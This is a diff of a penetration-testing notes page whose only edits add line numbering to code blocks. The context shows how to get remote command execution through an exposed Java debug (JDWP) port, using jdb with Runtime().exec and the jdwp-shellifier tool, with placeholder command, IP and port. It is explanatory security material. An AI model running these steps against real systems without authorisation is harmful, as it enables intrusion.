@@ -279,12 +279,12 @@
 <p><code>JWDP</code> is the protocol used for communication between a debugger and a Java app (JVM).</p>
 <h2 id="manual-exploitation">Manual exploitation</h2>
 <p>It's possible to execute shell commands using <code>jdb</code>:</p>
-<pre><code class="language-bash">jdb -attach 8000
+<pre><code class="language-bash line-numbers">jdb -attach 8000
 </code></pre>
 
 <p>Then you need to find a good java thread to stop in and execute you command. It
 appears that the method <code>indexOf</code> of the <code>String</code> class is a good candidate:</p>
-<pre><code class="language-bash">trace go methods
+<pre><code class="language-bash line-numbers">trace go methods
 # wait that the jdb dies
 stop in java.lang.String().indexOf(int)
 print new java.lang.Runtime().exec(&quot;&lt;cmd&gt;&quot;)
@@ -296,7 +296,7 @@ be careful, the manual method often fails.</p>
 <p><code>jdwp-shellifier</code> is an exploitation tool to exploit <code>JWDP</code>. It's available on
 <a href="https://github.com/IOActive/jdwp-shellifier" target="_blank">github</a>.</p>
 <p>Again we use the <code>indexOf</code> method to break on, it's possible to use an other one.</p>
-<pre><code class="language-bash">git clone https://github.com/IOActive/jdwp-shellifier
+<pre><code class="language-bash line-numbers">git clone https://github.com/IOActive/jdwp-shellifier
 cd jdwp-shellifier
 python jdwp-shellifier.py -t &lt;ip&gt; - p &lt;port&gt; --break-on &quot;java.lang.String.indexOf&quot; --cmd &quot;&lt;cmd&gt;&quot;
 </code></pre>
@@ -328,6 +328,7 @@ python jdwp-shellifier.py -t &lt;ip&gt; - p &lt;port&gt; --break-on &quot;java.l
     <script>var base_url = '..';</script>
     <script src="../js/theme.js"></script>
     <script src="../js/prism-core.min.js"></script>
+    <script src="../js/prism-line-numbers.min.js"></script>
     <script src="../js/prism-clike.min.js"></script>
     <script src="../js/prism-yaml.min.js"></script>
     <script src="../js/prism-powershell.min.js"></script>
